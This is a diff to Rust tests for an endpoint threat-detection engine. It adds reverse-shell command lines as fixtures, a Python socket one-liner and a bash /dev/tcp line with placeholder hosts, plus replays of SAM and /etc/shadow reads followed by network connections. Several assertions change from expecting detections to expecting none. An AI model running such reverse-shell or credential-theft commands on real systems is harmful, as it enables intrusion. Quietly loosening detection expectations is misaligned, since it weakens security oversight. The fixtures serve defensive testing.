@@ -722,7 +722,7 @@ fn seed_kill_chain_templates(detection: &mut DetectionEngine) {
         max_inter_stage_secs: 30,
     });
 
-    // Reverse shell chain: shell → outbound non-standard port
+    // Reverse-shell template is gated on same-process socket-to-stdio witnesses in L4.
     detection.layer4.add_template(KillChainTemplate {
         name: "killchain_reverse_shell".to_string(),
         stages: vec![
@@ -987,6 +987,10 @@ fn load_ioc_files(detection: &mut DetectionEngine, configured_dir: &Path) {
         }
     }
 }
+
+#[cfg(test)]
+#[path = "tests_agentfix27.rs"]
+mod tests_agentfix27;
 
 #[cfg(test)]
 mod tests {
@@ -1427,7 +1431,7 @@ rule eguard_custom_dir_test {
         child.ppid = parent_pid;
         child.process = "python3".into();
         child.parent_process = "sh".into();
-        child.command_line = Some("python3 health_check.py".into());
+        child.command_line = Some("python3 -c 'import socket,os;s=socket.socket();s.connect((h,p));os.dup2(s.fileno(),0);os.system(\"/bin/sh -i\")'".into());
         engine.process_event(&child);
         child.ts_unix += 1;
         child.event_class = EventClass::NetworkConnect;
@@ -1487,6 +1491,7 @@ rule eguard_custom_dir_test {
         impersonator.pid = 201;
         impersonator.ppid = 200;
         impersonator.process = "eguard-agent".into();
+        impersonator.command_line = Some("bash -i >& /dev/tcp/H/P 0>&1".into());
         impersonator.parent_process = "sh".into();
         impersonator.ts_unix += 1;
         engine.process_event(&impersonator);
@@ -1659,6 +1664,83 @@ rule eguard_custom_dir_test {
         events
     }
 
+    fn agentfix28_system_file_network_replay(path: &str, delay: i64) -> usize {
+        let mut engine = detp1_engine("198.51.100.20:50053");
+        let mut read = detp1_fixture_event(4, 0, 1, EventClass::FileOpen, "System", "");
+        read.uid = 0;
+        read.file_path = Some(path.into());
+        let mut network = read.clone();
+        network.ts_unix += delay;
+        network.event_class = EventClass::NetworkConnect;
+        network.file_path = None;
+        network.dst_ip = Some("10.102.1.255".into());
+        network.dst_port = Some(137);
+        detp1_replay_count(&mut engine, &[read, network], "phi_credential_exfil")
+    }
+
+    #[test]
+    fn agentfix28_replay_cryptnet_systemprofile_does_not_exfil() {
+        assert_eq!(
+            agentfix28_system_file_network_replay(
+                r"C:\Windows\System32\config\systemprofile\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content\26C212D9399727259664BDFCA073966E_912C3CA51DE6018A7BE4CA7BC64AAFCD",
+                54
+            ),
+            0
+        );
+    }
+
+    #[test]
+    fn agentfix28_replay_office_systemprofile_does_not_exfil() {
+        assert_eq!(
+            agentfix28_system_file_network_replay(
+                r"C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Office\OTele\{BD5D4451-383D-47AE-8C81-6F717964EE12} (4) - 4720 - officeclicktorun.exe - OTele.dat",
+                34
+            ),
+            0
+        );
+    }
+
+    #[test]
+    fn agentfix28_replay_system_sam_still_exfils_to_broadcast() {
+        assert_eq!(
+            agentfix28_system_file_network_replay(r"C:\Windows\System32\config\SAM", 54),
+            1
+        );
+    }
+
+    #[test]
+    #[ignore = "AGENTFIX28 analysis only: Linux cron/own-server policy is not ruled"]
+    fn agentfix28_analysis_linux_cron_shadow_child_to_own_server() {
+        let mut read = detp1_fixture_event(2000, 1, 1, EventClass::FileOpen, "cron", "systemd");
+        read.uid = 0;
+        read.file_path = Some("/etc/shadow".into());
+        let mut network =
+            detp1_fixture_event(2001, 2000, 35, EventClass::NetworkConnect, "sh", "cron");
+        network.uid = 0;
+        network.dst_ip = Some("10.10.123.35".into());
+        network.dst_port = Some(50053);
+        let mut engine = detp1_engine("10.10.123.35:50053");
+        assert_eq!(
+            detp1_replay_count(
+                &mut engine,
+                &[read.clone(), network.clone()],
+                "phi_credential_exfil"
+            ),
+            0,
+            "FileOpen-to-network correlation requires the same PID, not a child"
+        );
+        // Control: the configured peer is tagged, but L2 does not exempt it.
+        network.pid = read.pid;
+        network.ppid = read.ppid;
+        network.process = read.process.clone();
+        network.parent_process = read.parent_process.clone();
+        let mut engine = detp1_engine("10.10.123.35:50053");
+        assert_eq!(
+            detp1_replay_count(&mut engine, &[read, network], "phi_credential_exfil"),
+            1
+        );
+    }
+
     #[test]
     fn detp1_phase0_replay_anonymized_groups_and_malicious_lookalikes() {
         // Five historical group shapes, not reconstructed customer commands or event IDs.
@@ -1674,8 +1756,8 @@ rule eguard_custom_dir_test {
                 );
             }
             assert_eq!(
-                total, instances as usize,
-                "distinct interpreter groups retain one finding per instance"
+                total, 0,
+                "health checks without socket-to-stdio witnesses are not reverse shells"
             );
         }
         // Group 4: an account lookup is not secret access.
@@ -1695,7 +1777,7 @@ rule eguard_custom_dir_test {
             ),
             0
         );
-        // Group 5 remains reviewable; no blanket package-backup allowlist.
+        // Package metadata is not a secret/data source; secret archives still match.
         let mut engine = detp1_engine("198.51.100.20:50053");
         engine
             .load_sigma_rule_yaml(include_str!(
@@ -1713,7 +1795,7 @@ rule eguard_custom_dir_test {
         archive.command_line = Some("tar -czf /var/backups/package-db.tgz /var/lib/dpkg".into());
         assert_eq!(
             detp1_replay_count(&mut engine, &[archive], "linux_data_staging_archive"),
-            1
+            0
         );
         // Real reverse-shell behavior survives both external and configured-server peers,
         // including a non-control-plane peer using the product's usual port.
